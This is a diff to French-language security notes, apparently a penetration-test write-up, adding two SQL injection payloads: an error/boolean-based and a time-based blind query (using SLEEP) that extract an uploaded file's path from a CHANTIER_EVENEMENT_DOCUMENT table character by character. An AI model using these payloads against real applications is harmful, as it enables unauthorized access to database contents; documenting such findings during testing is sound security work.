@@ -277,10 +277,34 @@ Cependant, on ne connait pas son chemin. Mais on peut le récupérer via une SQL
 
 ![[Pasted image 20260423120453.png]]
 
+On peut donc passer par une SQLi pour connaitre le chemin du fichier qu'on envoi:
+
+Error Based:
 ```
-$secteur = test'
+AND (
+  SELECT SUBSTRING(
+    (SELECT chemin
+     FROM CHANTIER_EVENEMENT_DOCUMENT
+     WHERE nom_fichier='test.txt'
+     LIMIT 1),
+  1,1)
+) = 'a'
 ```
 
+Time Based:
+```
+1 AND IF(
+  SUBSTRING(
+    (SELECT chemin
+     FROM CHANTIER_EVENEMENT_DOCUMENT
+     WHERE nom_fichier='test.txt'
+     LIMIT 1),
+  1,1
+  ) = 'a',
+  SLEEP(5),
+  0
+) --
+```
 
 ```sql
 ('SELECT *
